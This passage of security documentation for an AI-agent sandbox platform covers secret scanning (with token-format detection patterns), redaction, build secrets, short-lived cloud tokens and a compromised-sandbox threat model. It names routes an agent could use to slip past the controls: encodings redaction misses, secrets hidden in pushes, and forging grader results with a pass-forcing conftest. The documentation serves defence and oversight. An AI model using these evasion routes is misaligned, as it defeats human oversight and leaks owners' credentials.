- a match for a high-signal token format: GitHub (`ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`, `github_pat_`), Slack (`xox?-`, `xapp-`, webhook URLs), AWS access key ids (`AKIA`, `ASIA`) and `aws_secret_access_key = …`, Google API keys (`AIza`), OAuth client secrets (`GOCSPX-`) and service-account key ids, Anthropic (`sk-ant-…`), OpenAI (`sk-proj-`, `sk-svcacct-`, `sk-admin-`, legacy keys), PEM and OpenSSH private keys (the header and the start of a body: code that checks for the header isn't a key), npm (`npm_`), PyPI (`pypi-`), GitLab (`glpat-`), Stripe live keys, Hugging Face (`hf_`), and hangar's own `hgr_`/`hgs_` tokens. Slack tokens need Slack's numbered shape, so `xoxb-test-token` fixtures pass.

Documentation placeholders such as `AKIAIOSFODNN7EXAMPLE` are ignored.

**On a hit the push doesn't happen.** The agent gets a follow-up turn listing each file and line (or commit) and the kind of secret, never the value. It is asked to remove the secret, rewrite the commits that carry it, and finish; hangar then scans again. After `HANGAR_SECRET_SCAN_ROUNDS` (2) such turns, or when the job's budget is spent, the job fails with reason `secret_found`, and nothing is pushed. Every hit is audited as `secret.found` (locations and kinds only). A best-of-N attempt that holds a secret isn't pushed either. `HANGAR_SECRET_SCAN=warn` turns blocking into job events, and `off` turns scanning off.

**Text hangar posts is masked.** PR titles and bodies, and comments on GitHub issues and in Slack threads, have every secret replaced with `[hangar: secret removed]`, and a job event says what kind was removed.

**Artifacts** handed back by the agent are masked the same way when they are text. A binary artifact that contains a stored credential's value is withheld, with a warning on the turn.

**Large diffs are fast to scan.** Hangar reads at most 64 MB of a change. Each pattern makes one pass over the text; each starts with a literal, which CPython's regex engine finds with a fast scan, or runs only when a substring it needs is there. File and line are worked out only for hits. A 60 MB change scans in about half a second.

**Not covered:**

- binary files in the diff;
- a secret split or encoded in a way the patterns don't know;
- anything past the first 64 MB of a change.

The sandbox's own git produces the diff, so a compromised sandbox can hide things from this scan. The scan exists to catch accidents, the common case: a `.env` file or a pasted token. What leaves through the gateway is scanned again there, from the pack itself (below).

### The agent's own pushes

A session's agent pushes on its own, through the [git gateway](#git-credential-gateway), and the sandbox can't be trusted to scan that. So the gateway reads the whole push and scans it before forwarding any of it (`pushscan.py`):

- **Self-contained packs.** The gateway adds `no-thin` to receive-pack's capability advertisement ("A client MUST NOT send a thin pack if the server advertises the no-thin capability", [gitprotocol-capabilities](https://git-scm.com/docs/gitprotocol-capabilities)), so every delta's base is in the pack and every object can be rebuilt without a copy of the repository. A pack that still refers to an object outside itself is refused.
- **What it reads.** Every object of the pack, inflated within a budget (4x `HANGAR_GATEWAY_SCAN_MAX_MB`) and with its deltas applied; the pack's checksum must match, so what was scanned is what GitHub gets. It scans the new commits and tags as written (messages and every header), file names, and the text of every new file at the path the new trees give it. Binary files are skipped, as the delivery scan skips them.
- **Only what is new.** A new blob is a whole file, so a hit in a file that held the same text in the commit the push builds on doesn't count: the gateway reads that file from GitHub's contents API with its own credential, only when there is a hit. If it can't tell, the hit stands.
- **On a hit the push is refused,** the way git shows a refusal: `remote:` lines naming each `file:line` and kind (never the value), and every ref `! [remote rejected] (hangar: possible secret: …)`. Nothing reaches GitHub. It is audited as `secret.found` with `source: gateway`, and shown in the session's events. `HANGAR_SECRET_SCAN=warn` lets it through, audited; `off` turns it off.
- **Bounded.** The gateway holds a push (in memory up to 8 MB, then on disk) of at most `HANGAR_GATEWAY_SCAN_MAX_MB` (64), and reads it into memory only once one of the two scan slots is free. Every object counts 256 bytes against the budget besides its contents, and a delta that says it builds more than what is left of the budget is refused before it is built. A bigger push, a pack that can't be read, or one with more text than the scanner reads (64 MB) or more than 1,000 possible secrets, is refused in block mode, since hangar doesn't forward what it couldn't check, and let through with a `secret.unscanned` entry in warn mode.
- **Fast at 60 sessions.** The parse and the scan run in a worker thread, not on the event loop that serves every sandbox's git and proxy traffic, two pushes at a time, in one pass per pattern over all of a push's text. A 17 MB push of source code parses in about 0.15 s and scans in about 0.45 s; a push of a few files takes milliseconds.

A determined agent can still encode a secret in a way the patterns don't know: like the delivery scan, this one catches accidents and careless exfiltration, not every one. A direct-mode sandbox pushing with its own token isn't scanned at all.

## Redaction

Tool results, events, turn summaries, artifacts and audit entries are passed through `broker.redact`. It masks every stored credential value (8 characters or more) as `***`. For values of 12 characters or more it also masks cheap, common encodings:

- the value reversed (`rev`, hardening B4);
- hex, in lower and upper case (`xxd -p`);
- base64, standard and URL-safe, at each of the three alignments a value can have inside a longer string, so `echo "X=$SECRET" | base64` is caught as well as `printf %s "$SECRET" | base64`;
- percent-encoding, with or without `/` escaped, in upper- or lower-case escapes.

Line-wrapped output, such as `base64`'s 76 columns and `xxd -p`'s 60, is matched across the line breaks. Below 12 characters an encoded form would match too much ordinary text.

**What redaction can't stop:**

- any transformation not on that list: gzip, base32, an XOR, two layers of encoding, every other character, a value split across commands;
- secrets hangar never stored;
- a secret sent out over the network instead of printed.

An agent that can read a secret can always get it out in a form redaction doesn't know. Redaction keeps secrets out of logs, transcripts and results by accident. The protections that hold against a determined agent keep the secret out of the sandbox altogether: the [git gateway](#git-credential-gateway), [build secrets](#build-secrets), [short-lived cloud credentials](#short-lived-cloud-credentials) and control-plane-only credentials.

## Build secrets

Some secrets are needed only to build an environment, such as a private registry's read token. They go to the build step and never to a running sandbox. They can be named only where an admin decides:

```yaml
name: api
build_secrets: {NPM_TOKEN: npm-ci-token}      # secret id -> vault credential; needs an admin
```

A repo policy can set its own (`PUT /api/repos/policy` with `build_secrets`, admin), which win for that repo. A repo's own environment file lists only the ids it needs (`build_secrets: [NPM_TOKEN]`); an id the admin hasn't mapped fails the build and names the id. So anyone who can push to the repo can ask for a mapped secret by id, but can't point an id at another credential.

How a build uses them (`hangar.buildsecrets`, used by repo environment builds):

| Build step | How the value gets there | What keeps it out of the sandbox |
| --- | --- | --- |
| Dockerfile (`docker build`) | `--secret id=NPM_TOKEN,src=<file>`; the Dockerfile uses `RUN --mount=type=secret,id=NPM_TOKEN[,env=NPM_TOKEN] …` | BuildKit mounts it for that one instruction and doesn't write it to a layer. The file is 0600 in a 0700 temp directory, removed when the build ends, and never on a command line or in the build log. |
| Install step in a build sandbox | env vars on that one exec, the only secrets the build sandbox holds ([what else it holds](#jobs-only-fetch-hangar-delivers): a fetch-only grant) | Never written to `~/.hangar/env`. Before the result is captured, `leak_scan` greps the workspace and `$HOME` for each value (patterns from a 0600 file, not the command line) and fails the build naming the file and the id, never the value (`npm config set` writes the token to `.npmrc`). The build sandbox is destroyed. |
| Cloud Build | refused | Cloud Build reads Secret Manager, not hangar's vault: build that image with Docker. |

**What a build passes on.** A repo build's checkout, `install`'s work, goes into every sandbox started from the build, so it is trusted like the repo's default branch. Its `.git` is the exception: hooks and git config are things git runs, not code anyone reviews, so before the checkout is captured hangar removes the hooks (keeping the samples) and every config key but the remotes, branches, user and core settings (`envbuilds.GIT_SCRUB`, editing the file without following its includes). Hangar's own git commands in a sandbox started from a build run with hooks and fsmonitor off, which also covers builds made before. On Kubernetes, a build's SandboxTemplate is deleted only once no live sandbox runs on it.

Mark a build-only credential control-plane only (`hangar cred exposure npm-ci-token control_plane`) so no environment can also map it into a running sandbox. Signing keys, bot tokens and GitHub App keys are refused as build secrets. **A build secret reaches the code the build runs, and that code can send it wherever the build's network allows.** Give builds tokens that can only read the registry they're for. The build sandbox follows the environment's [egress mode](#egress-allowlists).

## Short-lived cloud credentials

Don't store a GCP service-account key or an AWS access key as a credential: the agent can read it, and it lives as long as the key does. Give the environment `cloud:` instead (admin only):

```yaml
name: infra
cloud:
  gcp:
    provider: projects/123456789/locations/global/workloadIdentityPools/hangar/providers/hangar
    service_account: ci-agent@my-proj.iam.gserviceaccount.com   # optional: impersonate it
  aws:
    role_arn: arn:aws:iam::123456789012:role/hangar-agents
    region: us-east-1                                            # optional
  lifetime_minutes: 60                                           # 5 to 60
```

Hangar is an OIDC issuer (`cloudcreds.py`). Each sandbox of the environment gets an ID token, signed RS256 with a key kept in hangar's vault, with these claims:

- `iss`: `HANGAR_OIDC_ISSUER`, or `HANGAR_PUBLIC_URL`;
- `sub`: `hangar:env:<environment>`, where the environment is the one whose own file sets `cloud:`. Only an admin can write that, so a member's environment that `extends` it speaks for it, and can't take another's subject by taking its name (before an admin creates it, or after one is removed);
- `aud`: the cloud's audience;
- `exp`: `lifetime_minutes` from now;
- `environment` (the same name) and `person` (who started the sandbox): hangar vouches for both, so grant on them;
- `sandbox_environment`, `repo`, `sandbox`, `session` and `job`: they describe the sandbox, but whoever starts one picks its repo and environment, so **don't grant on them**. A condition on `repo` lets any member who can start a sandbox with `cloud:` name that repo.

The token is written to `~/.hangar/cloud/` (0600). While the sandbox runs, hangar replaces it once less than half its life is left, checking every 5 minutes. It is never renewed after the sandbox stops, and each issuance is audited as `cloud.token`. Discovery is public at `/.well-known/openid-configuration`, and the public keys at `/oidc/jwks.json`. `POST /api/cloud/rotate` (admin) adds a new signing key and signs with it at once. The keys it replaces stay published for an hour (the longest a token can live), so tokens already issued still verify, and then drop out of the JWKS. For a key that leaked, `POST /api/cloud/rotate?drop_old=true` unpublishes the old keys now, and the tokens they signed stop working. Where the JWKS is uploaded (GCP's `--jwk-json-path`), upload it again right after rotating: tokens signed with the new key fail until Google has it.

**Scheduled rotation.** `HANGAR_OIDC_KEY_ROTATION_DAYS` (0, off) makes a new signing key every that many days. The next key goes into the JWKS a week (at most half the period) before it signs anything, audited as `cloud.key.next` with the time it takes over, so a relying party that caches the JWKS has it in time; where the JWKS is uploaded, upload it again after that entry and before then. When it takes over (`cloud.key.rotated`) the key before it retires and leaves the JWKS an hour later. It is off by default because an uploaded JWKS that isn't refreshed would make every token fail after the switch; turn it on where the cloud fetches the JWKS itself (AWS, or GCP without `--jwk-json-path`).

**Lifetime.** A token lives at most 60 minutes (`lifetime_minutes`, 5 to 60). It is renewed every few minutes while its sandbox runs, so the lifetime only bounds how long a copy outlives the sandbox.

**GCP (Workload Identity Federation).** The sandbox gets the `external_account` credential configuration that `gcloud iam workload-identity-pools create-cred-config --credential-source-file=… --credential-source-type=text` produces. `GOOGLE_APPLICATION_CREDENTIALS` and `CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE` point client libraries and gcloud at it. google-auth reads the token file again on every refresh, so a renewed token is picked up. Set up the pool once:

```sh
curl -s https://hangar.example.com/oidc/jwks.json > hangar-jwks.json   # or let Google fetch it, if it can reach hangar
gcloud iam workload-identity-pools create hangar --location=global
gcloud iam workload-identity-pools providers create-oidc hangar --location=global --workload-identity-pool=hangar \
  --issuer-uri=https://hangar.example.com --jwk-json-path=hangar-jwks.json \
  --attribute-mapping='google.subject=assertion.sub,attribute.environment=assertion.environment,attribute.person=assertion.person' \
  --attribute-condition='assertion.environment in ["infra"]'
gcloud iam service-accounts add-iam-policy-binding ci-agent@my-proj.iam.gserviceaccount.com \
  --role=roles/iam.workloadIdentityUser \
  --member='principal://iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/hangar/subject/hangar:env:infra'
```

- **The issuer can stay private.** Uploading the JWKS (`--jwk-json-path`, up to 8 keys) means Google never has to reach hangar, which suits a control plane behind IAP. Re-upload after `rotate`.
- **The audience** is the provider's default, `https://iam.googleapis.com/projects/…/providers/…`. Set `gcp.audience` if the provider was created with `--allowed-audiences`.
- **Tokens:** Google accepts RS256 tokens whose `exp` is at most 24 hours after `iat`.

**AWS (`AssumeRoleWithWebIdentity`).** The sandbox gets `AWS_ROLE_ARN`, `AWS_WEB_IDENTITY_TOKEN_FILE` and `AWS_ROLE_SESSION_NAME` (`hangar-<sandbox id>`), which every AWS SDK and the CLI use to assume the role from the token file and re-read it. The token's `aud` is `aws.audience` (`sts.amazonaws.com`). Create an IAM OIDC identity provider for the issuer URL with that audience as its client id. The role's trust policy **must** match the condition key `<issuer without https://>:sub` against `hangar:env:<environment>`, as well as `:aud`. Every environment's token has the same `aud`, and `AWS_ROLE_ARN` is just a variable the agent can change, so a trust policy that checks only `aud` lets any hangar sandbox with AWS credentials assume the role. For the same reason, on GCP grant to `principal://…/subject/hangar:env:<environment>` (or an attribute condition on `environment`), never to the whole pool (`principalSet://…/*`). **AWS fetches the discovery document and JWKS itself**, so the issuer URL must be publicly reachable over HTTPS. If hangar sits behind IAP, publish the two documents somewhere public (`/.well-known/openid-configuration` with `jwks_uri` pointing at the JWKS file) and set `HANGAR_OIDC_ISSUER` to that URL.

**Egress.** In `allowlist` and `none` environments the token exchange is let through automatically: `sts.googleapis.com` and `iamcredentials.googleapis.com`, `sts.amazonaws.com` and `sts.<region>.amazonaws.com`.

**What it does and doesn't cover.**

- The agent can read the token and use it, which is the point, but only:
  - for the audience it names;
  - for what the cloud grants its subject, which you can narrow per environment and person (not per repo: see the claims above);
  - for at most `lifetime_minutes` after the sandbox stops.
- An access token the cloud already issued from it lives its own lifetime (GCP's default is an hour).
- Don't give a sandbox a role you wouldn't give the agent.
- The token is not stored in the vault, so redaction doesn't mask it; it's short-lived instead.
- Tested against google-auth's own `external_account` code with a fake STS. A live pool and an AWS account weren't available to this change.

## Build caches

Dependency and compile caches ([caches.md](caches.md)) are shared infrastructure. Members, branches and repos of
different trust all use them, and what one sandbox writes another sandbox builds from. A poisoned entry (a
`node_modules` with a backdoor, a Bazel action result naming a malicious output, a turbo artifact with a different
`dist/`) runs in the next sandbox that restores it, under that person's credentials, and can end up in their PR. So
the rules are about who can write what other sandboxes read.

**Assets.** A repo's shared cache layer, which every sandbox of the repo reads. Each session's private layer. The
cached bytes themselves (dependencies and compile output of private repos). And the control plane's memory and
storage.

**Adversaries.** An agent (or the repo code it runs) in a session or job sandbox: a member's own, another member's,
or one working on an untrusted branch or a PR from outside. Someone who can create sandboxes with labels of their
choosing. A sandbox of a different repo. Someone who can read or write the cache bucket.

| Threat | What stops it | Tests |
| --- | --- | --- |
| A session or job writes the repo's shared layer | Writes from anything but a repo build go to the writer's own private layer, or are refused (403) with `HANGAR_BUILD_CACHE_PRIVATE_WRITES=false`. The shared layer is written only by a sandbox hangar created for a running repo build of that repo, and that build runs the `install` of the default branch (or of the branch the environment names). | `test_buildcache.py` |
| A member's environment writes what everyone's sandboxes read | Members can create environments, and an environment's image and `setup` run in its builds before `install`. Each environment has its own shared layer per repo, written by builds in that environment and read only by sandboxes of that environment. That is the trust a sandbox already places in its environment, which runs its `setup` too. | `test_buildcache.py` |
| Faking a build | A `hangar.build` label is anyone's to set on a sandbox they create. A sandbox is trusted only if the build it names exists, is running, is of the same repo, and created that sandbox (actor `hangar:build:<id>`, which no principal name can be). Agent-led setup's validation sandboxes (an agent-written branch) are never trusted. | `test_buildcache.py` |
| Reading or writing another session's private layer | The layer is named by the session and branch. A sandbox's `hangar.session` label counts only for a session of the same person; otherwise the layer is the sandbox's own. Nothing is promoted from a private layer, and builds don't read private layers. | `test_buildcache.py` |
| Reading another repo's caches | The credential is the sandbox's git grant, which names one repo, and every lookup is within that repo. Chunks live under a per-repo prefix and are never shared across repos, so whether content exists in another repo can't be probed. A delivery grant reads nothing. | `test_buildcache.py` |
| Swapping or damaging stored objects (bucket access, a bad disk) | Chunks are sealed with the vault key (Fernet: encrypted and authenticated) and named by the SHA-256 of their plaintext; every read checks both and the whole object's digest. A failure is a miss and the entry is dropped. `hangar-cache` checks the archive's digest again before extracting. A Bazel CAS write must hash to its name. | `test_buildcache.py` |
| A build secret in a shared cache | Every upload from a build that has build secrets, from the start of `install` (sccache, Bazel and turbo upload while it runs) to the save after it, is scanned in the stream, gzip inflated (bounded), for each value, its longest line, its percent-encoding and its base64 at every alignment. A hit refuses the upload (422) and nothing is stored; so does a format the scan can't look into (zstd, zip, xz, bzip2, 7z, lz4: sccache's entries and turbo's artifacts among them), a damaged gzip stream, or data after one. Such a build writes no sccache or turbo entries to the shared layer. The build's log says which kind failed, never the value. | `test_buildcache.py` |
| A restore overwriting the sandbox's own work | Archives are extracted with `--skip-old-files` into `$HOME` or the checkout only (GNU tar drops leading `/` and `..` members). Directories in the checkout are restored only when git ignores them, and not at all over a repo build's image. | `test_buildcache.py` |
| A session filling the repo's caches to push the shared entries out | Caps per repo and in total. Eviction takes private layers' entries first, then the least recently used, and private entries expire after 3 days unused. 64 requests in flight per sandbox, and objects up to `HANGAR_BUILD_CACHE_OBJECT_MAX_MB`. Cache bytes held in memory are capped (`HANGAR_BUILD_CACHE_TRANSFER_MB`). | `test_buildcache.py` |
| A grant after its sandbox stops | Grants are verified as the gateway verifies them (hashed, constant time, live sandbox only). A verified grant is reused for 5 seconds, so a stopped sandbox's grant works for at most 5 seconds more. | `test_buildcache.py` |

What is **not** covered:

- **The default branch is trusted.** Whatever its `install` writes into the caches (or into the build's image)
  every sandbox of the repo in that environment gets. That is the same trust the repo build itself has: protect the
  default branch with reviews. The same goes for a branch an environment names (`repo.branch`): its owner decides.
- **A session poisons only itself.** A sandbox can put anything in its own private layer, and its session's later
  sandboxes read it. That is the session's own work, like its branch.
- **Compile caches trust their keys.** Bazel's action cache, sccache and turbo entries are named by hashes the client
  computes, so an entry can't be checked against its key (only the CAS can). This is why only trusted builds write
  the shared layer. Turborepo's own artifact signatures (`TURBO_REMOTE_CACHE_SIGNATURE_KEY`) add a check on the
  client and pass through hangar unchanged.
- **After an incident**, purge the repo's caches (`hangar admin caches purge <repo>`, audited). The next build
  writes them again.

## Threat model: a compromised sandbox

The attacker controls everything inside one sandbox: the agent's process, its files, `~/.hangar/env` (so every command hangar runs there), its git binary and its network traffic. What it should not get:

| Goal | What stops it | Tests |
| --- | --- | --- |
| The upstream GitHub token | Never written into a gateway-mode sandbox (env, files, harness configs). Gateway errors carry exception types, never values; upstream redirects aren't followed or relayed; the host segment must equal the grant's host and a configured upstream, so it can't be pointed elsewhere. | `test_gateway_git.py` |
| A push outside its grant | The command list is parsed before any pack byte goes upstream: one deadline for the whole list, at most 8 commands, no NUL tricks, no special pkt-lines, strict ref names, no deletes, no tags, no signed pushes, and no push options in any spelling (git enables them for `push-options=<anything>` too). | `test_gateway.py`, `test_sandbox_security.py` |
| Pushing a branch itself (a job's agent, the Cloud Doctor's root-cause job reading untrusted evidence), so `on: push` workflows run on it | Every job's sandbox holds a fetch-only grant, whatever its environment's `credential_mode`: a push is refused at its first request. Hangar pushes the commit it checked, after verify, the secret scan and the landing checks, with a grant pinned to that ref and commit for minutes; a lifted copy can push nothing else. | `test_least_privilege.py`, `test_interactions.py` |
| The environment's credentials, `secrets:` or cloud tokens, from repo code in a build (`install`, the validation's agent-written one) | Build and validation sandboxes get a fetch-only grant and nothing else: no credential (without the gateway not even git's), no `secrets:`, no cloud token. A build's mapped build secrets reach its install command alone. | `test_least_privilege.py`, `test_autoinstall.py` |
| Another job's or session's branch | Exact grants for a session's own branch. The `hangar/**` creation rule can't touch a branch another live sandbox, any session or any unfinished job (queued ones included) owns, can't create one that blocks it (`a/b` vs `a/b/c`), and can't create anything under `hangar/session/`. A new session starts from its branch if it exists, so a planted branch would otherwise become its starting point. | `test_sandbox_security.py` |
| A dead or foreign grant | Grants are 256-bit, stored hashed, compared in constant time, and stop working when their sandbox stops, pauses, expires or is destroyed. A fork gets its own. 30 invalid grants a minute from one address get 429 without a lookup. | `test_gateway_git.py`, `test_sandbox_security.py` |
| The control plane's attention | 8 requests in flight per grant (counted on the same Authorization header the gateway authenticates), deadlines on reading push and fetch requests, push size cap, a single pass over the command list. What hangar reads back is bounded where it is read, not by sizes the sandbox reports (its `~/.hangar/env` can redefine `stat` and `find`): command output keeps a bounded tail as it streams (Docker, Kubernetes), and every file hangar reads from a sandbox is read with a cap (Docker, Kubernetes, E2B): results, questions, artifacts, checkpoint parts and run logs; rotated auth files written back on release and login captures (1 MB; a bigger one is not stored); `~/.hangar/env` (1 MB; a bigger one is rewritten); harness configs hangar merges into (8 MB; a bigger one is left alone, with a warning); workspace snapshots (`HANGAR_SNAPSHOT_MAX_MB`, 512); and the MCP `read_file` tool (its first 10 MB). | `test_sandbox_security.py`, `test_e2e_sandbox_limits_docker.py`, `test_sweep_caps.py` |
| The requester's machine (`session pull --checkout`) | The untracked-files archive is the sandbox's: only regular files, directories and in-tree symlinks are restored, never under `.git` (any spelling), never through a symlink (including one the session's patch created), never over an existing file, at most 20,000 entries and 1 GB (the archive is capped compressed; gzip expands ~1000x). The checkpoint's head must be a commit id. The patch goes through `git apply`, which refuses `.git` paths. | `test_sandbox_security.py` |
| The dashboard's origin | Artifacts are served as attachments with `Content-Security-Policy: sandbox` and `nosniff`; active types are downgraded to `text/plain`. | `test_exchange.py` |
| Sending code or tokens to a host of its choosing (`allowlist`/`none` environments) | The network admits only the git gateway and the egress proxy, with no DNS. The proxy authenticates the sandbox and checks each connection's host against the sandbox's allowlist, then reads the whole ClientHello: one SNI, the CONNECT host, and no Encrypted ClientHello (GREASE included), no SSL 2/3 hello, no repeated extension, and the same for a second hello after a HelloRetryRequest. Plain HTTP must carry the host in `Host`. Approvals come from the owner, never from the agent. Every denial is audited and shown in the session, and allowed traffic is audited per host. | `test_egress.py`, `test_egress_tls.py`, `test_k8s_network.py` |
| Publishing to a package registry or GitHub with its own token (`allowlist`) | With the gateway configured, `pypi`, `npm` and `go` are served by hangar's read-only mirror (GET and HEAD, under the upstream only, no client credentials), so the registries' hosts, which take uploads, stay closed; `crates` opens the read-only index and download hosts only; `packages` no longer includes `github`, and gateway-mode sandboxes read their repo's API through the gateway, GET only. Go modules come only from the module proxy's cache, so a module path can't make it fetch from an origin. | `test_pkgmirror.py`, `test_e2e_egress_docker.py` |
| Sending an experiment's hidden tests out, or forging their result (a trial's patch, run by its grader) | The grader's sandbox is sealed: egress `none` with no host at all, on the proxy-only network, no credential, `mcp:`, computer or services, its git grant revoked before the patch's code runs. The hidden tests are outside the repo (root-owned on Docker), and `hangar-grade pytest` loads nothing the patch added first. With the uid split hangar's user writes the grade; base-must-fail checks and canaries flag what isolation can't stop. See [graders](#graders). | `test_sealed_grader.py`, `test_grade_forgery.py`, `test_e2e_sealed_docker.py` |
| The VPC, the cluster or the metadata server through the proxy | The proxy resolves names itself and connects only to the public address it checked (a name that re-resolves later doesn't matter). Loopback and link-local addresses are refused even for `HANGAR_EGRESS_PRIVATE_HOSTS`. | `test_egress.py` |
| Getting a secret into a pushed branch, a PR or a Slack thread (by accident, the common case) | Before hangar delivers a job, the change and its commit messages are scanned for stored values, their encodings, and high-signal token formats. A hit blocks the push and goes back to the agent with file and line, never the value. Every push through the git gateway, the agent's own included, is scanned again there from the pack itself, before any of it goes upstream. PR text, comments and artifacts are masked. | `test_secretscan.py`, `test_pushscan.py`, `test_gateway_git.py` |
| Reading a stored secret back through hangar (`exec` output, events, results) | Every stored value is masked verbatim and, from 12 characters, reversed, in hex, base64 at any alignment (wrapped too) and percent-encoded. The B4 repro (`\| rev`) now comes back `***`. This is not a wall: other encodings get through ([redaction](#redaction)). | `test_secretscan.py` |
| A build secret in the running sandbox | Build secrets are named only in admin-set places, reach only the build step (BuildKit secret mounts, or one exec's environment in a build sandbox checked for leftovers before capture), and are never written to `~/.hangar/env`. | `test_secretscan.py` |
| A cloud key it can keep (`cloud:` environments) | No cloud key is stored or injected: a per-sandbox OIDC token, scoped to one audience, valid at most `lifetime_minutes`, renewed only while the sandbox runs, is exchanged by the cloud for short-lived credentials. | `test_cloudcreds.py` |
| Cloud credentials | GKE node pools use `GKE_METADATA` (Workload Identity), so pods never see the node's service account; sandbox pods mount no Kubernetes token. `sandbox-network.yaml` blocks the metadata server, which matters with Pod snapshots: their KSA can read every sandbox's snapshot. | manifests checked with a server-side dry run |
| Other sandboxes and the API | GKE: no ingress to sandbox pods (except from hangar's pods to the [envd](envd.md) port), no egress to private ranges; only the gateway port of hangar pods is open. Docker: no traffic between sandboxes on hangar's network. | manifests checked with a server-side dry run and `test_k8s_network.py` (every policy file read together); `test_e2e_isolation_docker.py` |
| A turn's driver and the approvals it relays | Docker sandboxes whose agent has no sudo run each turn split ([the uid split](steering.md#the-uid-split)): the driver, its key, its control files and the turn's script belong to a `hangar` user, the agent's harness runs as the sandbox user with no capabilities, so code a person allowed can't read the key, write a command or signal or trace the driver. The harness and what it starts run with `no_new_privs`; hangar reads a split run's status, log and approvals from its own files, never through the agent's links. In `ask` and `deny-risky` turns hangar also owns the harness's binary, environment and settings ([hangar-owned harness settings](steering.md#hangar-owned-harness-settings)). Elsewhere one user, with a warning on `ask` and `deny-risky` turns (`HANGAR_UID_SPLIT=required` refuses them). | `test_e2e_isolation_docker.py`, `test_e2e_harden_docker.py`, `test_isolation.py`, `test_harden.py`, `test_harden_real_clis.py` |
| The node, other pods or the metadata server from a heavy sandbox (root in its VM, with Docker) | A heavy sandbox runs only on a provider with a VM around it (Kata, E2B, CubeSandbox; Docker only with `HANGAR_HEAVY_DOCKER_PRIVILEGED`, for CI). Under Kata the container is privileged inside the guest only: kata-deploy sets containerd's `privileged_without_host_devices`, so no host device reaches the VM. The containers dockerd starts are NATed to the pod's address, so the pod's NetworkPolicy applies to them (no private ranges, no link-local, only the proxy in an allowlist environment); dockerd listens on its Unix socket only. Docker Hub pulls go through the egress policy or hangar's read-only mirror, which takes the sandbox's credential in its path and serves only running heavy sandboxes. Setting `heavy` and big profiles on an environment is an admin's, and Docker is deny by default for a repo: its own `.hangar/environment.yaml` only requests it, honored where an admin's repo policy says `heavy: allow` (anyone who can push the default branch writes that file). At admission (`heavy-policy.yaml`), a privileged container or an added capability in `hangar-sandboxes` needs a Kata runtime class, a RuntimeClass named `kata*` needs a Kata handler, and no sandbox pod gets host namespaces, `hostPath` (Kata would share it into the VM) or `hostPort`. The heavy nodes run as a node service account of their own with only a node's roles, so a guest escape to the node doesn't get the project's default compute identity. | `test_heavy.py`, `test_heavy_mirror.py`, `test_e2e_heavy_docker.py`; the policies checked against a real kube-apiserver 1.36 (review of #117); the `heavy` acceptance check probes the metadata servers from a container inside the VM |
| Another sandbox's [envd](envd.md) daemon | A daemon accepts only requests signed with its own sandbox's token: HMAC(vault key, sandbox id), never stored and never sent. Each request carries an HMAC over its time, a nonce, method, path and body hash, usable once and for five minutes, so a request that reaches the wrong address (a reused IP) gives whoever got it nothing; a peer without the token is refused before its body is read and can't spend nonces, and connections are capped per address and closed when idle. Answers must carry an HMAC proof of the token, so nothing else at a sandbox's address is taken for its daemon. What a daemon returns is capped (message size, output tail, read limit), never decompressed, and waited for only so long. | `test_envd.py`, `cargo test` in `envd/` |

### Graders

An experiment's grader ([jobs.md](jobs.md#grading)) runs a trial's agent-written code beside hidden tests that must not leave and must not be bent. Its sandbox is sealed (`delivery.sealed`):

- **Nothing out.** Egress `none` with no host at all: not the harness's model API (`none` normally keeps it, since an agent must reach its model, and a grader runs no agent), not the environment's MCP servers or cloud, not approved requests, whatever the environment or the repo policy say. It is always on the proxy-only network, an `open` environment's too. While it is set up without the git gateway, the proxy lets the clone reach the repo's host, and only until the base and the patch are in; its git grant is revoked then too, before any of the trial's code runs. `network: mirror` adds hangar's read-only package mirror, when it is on.
- **Nothing to take.** No credential, `secrets:` or cloud token (as a repo build), no `mcp:`, no `computer:`, no services, no build caches, no GitHub API, nothing the repo's `.hangar/environment.yaml` would start, and never a warm pool sandbox.
- **Hidden tests from a pristine copy.** They are written outside the repo, on Docker root-owned (the agent's user reads them and can't change them), and `hangar-grade pytest` runs them with `python -I`, `--noconftest`, `-c /dev/null`, `addopts` cleared, no cache and no bytecode, putting the repo on `sys.path` only after pytest has loaded its plugins. A root `conftest.py` that forces a pass, `pytest.ini` options, `sitecustomize.py`, `.pth` files and plugins declared in a `*.dist-info` change nothing. Each patch's files that could hook a test run are recorded as `tamper_signals`.

- **The grade is hangar's** where the sandbox has the uid split (Docker, `sudo: false`): a wrapper running as hangar's user starts the command as the agent with no capabilities and `no_new_privs`, takes its exit code and output, and reads `$HANGAR_GRADE_OUT` and the junit from pipes it created (the agent's to write, nobody else's to open), writing the grade in a 0700 directory of its own. A patch that writes `{"pass": true}` everywhere it can doesn't change it (`trust: isolated`).
- **Detectors.** Hidden tests that pass on the base, or a reference patch that fails them, make the task `invalid_task`. A canary comment in every hidden test file, found in a trial's patch, RESULT.md, trace or egress records, makes the trial `contaminated` (a `grade.canary_seen` audit entry). `touched_tests` lists existing tests the trial changed.

Not covered: code under test runs inside the test runner's process, so it can patch the runner as it runs and lie on the pipe. Isolation stops writes to the grade, not that; the detectors above and the sister tool's outcome graders and fresh hidden tests are the defence. Without the uid split (GKE, or `sudo: true`) the trial's code could write `$HANGAR_GRADE_OUT`, and outside Docker the hidden tests sit under `/tmp`, where it can change them (`trust: best_effort`; #152 studies closing it on GKE). Non-Python graders get no safe runner (`trust: low`). Tests: `test_sealed_grader.py`, `test_grade_forgery.py`, `test_e2e_sealed_docker.py`.

What is **not** covered:

- **Docker on a laptop or VM is a trusted-use setup.** Sandboxes can't reach each other's ports ([networking](#sandbox-networking-on-docker)), but they can reach the host (and the API port if hangar listens beyond loopback). They get `sudo` only in an environment that sets `sudo: true` (off by default since #124), and a job's sandbox runs with `no-new-privileges` under `HANGAR_INTAKE_POSTURE=enforce`, so sudo fails there anyway. On a cloud VM, block the metadata server as the single-VM install does (the rule above). For untrusted work use GKE (gVisor/Kata).
- **Inside the sandbox the agent is in charge.** Hangar's own reads and writes there (attachments in, results and artifacts out) follow whatever the agent left in place. On Docker with `sudo: true` that grants nothing new; without sudo (the default), a symlink placed in `$HANGAR_IO` can make hangar write an attachment, or read a file, as root inside that container.
- **Without the gateway** a job's sandbox holds the environment's git token (`credential_mode: direct`) and can push wherever it reaches; landing never lands such a job. Builds and validations then hold no git credential, so private repos can't build.
